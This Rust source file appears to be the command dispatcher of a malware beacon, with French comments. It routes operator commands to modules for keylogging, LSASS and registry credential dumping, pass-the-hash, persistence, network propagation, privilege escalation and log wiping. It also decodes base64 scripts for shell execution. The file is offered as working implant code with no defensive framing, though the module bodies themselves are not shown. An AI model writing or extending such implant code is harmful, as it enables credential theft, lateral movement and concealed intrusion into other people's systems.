pub mod avscan;
pub mod crack;
pub mod creds;
pub mod detect;
pub mod keylog;
pub mod logroll;
pub mod loot;
pub mod persist;
pub mod privesc;
pub mod propagate;
pub mod pth;
pub mod rdp;
pub mod screenshot;
pub mod shell;
pub mod shell_builtin;
pub mod syscall;
pub mod transfer;
pub mod whatever;

/// Aiguillage commande → module.
/// Un module qui panique ou échoue renvoie une ligne d'erreur :
/// le beacon ne tombe jamais à cause d'une capacité.
pub fn dispatch(command: &str, args: &str) -> String {
    let result = std::panic::catch_unwind(|| run_module(command, args));
    match result {
        Ok(s) => s,
        Err(_) => format!("[{}] panique dans le module", command),
    }
}

fn run_module(command: &str, args: &str) -> String {
    match command {
        "shell"                => shell::run(args),
        "bshell"               => shell_builtin::run(args),
        "persist"              => persist::install(),
        "unpersist"            => persist::remove(),
        "keylog"               => keylog::run(args),
        "creds" | "creduser"   => creds::dump_lsass(),
        "credsmachine"         => creds::dump_hive(),
        "crack"                => crack::run(args),
        "pth"                  => pth::run(args),
        "loot"                 => loot::run(args),
        "propagate"            => propagate::run(args),
        "privesc"              => privesc::run(args),
        "rdp"                  => rdp::run(args),
        "screenshot"           => screenshot::run(args),
        "detect"               => detect::run(args),
        "avscan"               => avscan::run(args),
        "logroll"              => logroll::run(args),
        "whatever"             => whatever::run(args),
        "syscall"              => syscall::run(args),
        "download"             => transfer::download(args),
        "upload"               => transfer::upload(args),
        "run"                  => run_script(args),
        other                  => format!("commande inconnue : {}", other),
    }
}

fn run_script(args: &str) -> String {
    use base64::Engine;
    let decoded = base64::engine::general_purpose::STANDARD
        .decode(args.trim())
        .map(|b| String::from_utf8_lossy(&b).to_string())
        .unwrap_or_else(|_| args.to_string());
    shell::run(&decoded)
}
